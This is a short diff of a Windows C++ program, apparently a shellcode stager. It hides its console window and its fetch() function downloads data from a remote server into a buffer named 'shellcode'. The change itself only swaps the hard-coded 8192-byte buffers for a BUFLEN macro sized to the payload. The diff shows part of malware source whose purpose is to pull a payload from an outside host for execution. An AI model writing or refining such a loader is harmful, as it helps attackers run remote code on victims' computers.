@@ -2,11 +2,12 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <string>
-//#include <iostream>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+
+#define BUFLEN 8192 // adjust according to payload size * 4
 
 using namespace std;
 
@@ -24,9 +25,9 @@ int fetch(string server, string path) {
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
-	char buf[8192];
+	char buf[BUFLEN];
 	string response;
-	unsigned char shellcode[8192];
+	unsigned char shellcode[BUFLEN];
 
 	// initialize winsock, create socket and connect to server
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -45,7 +46,7 @@ int fetch(string server, string path) {
 		return -1;
 
 	// receive and store http response
-	if (recv(sock, buf, 8192, 0) < 1)
+	if (recv(sock, buf, BUFLEN, 0) < 1)
 		return -1;
 	
 	response += buf;
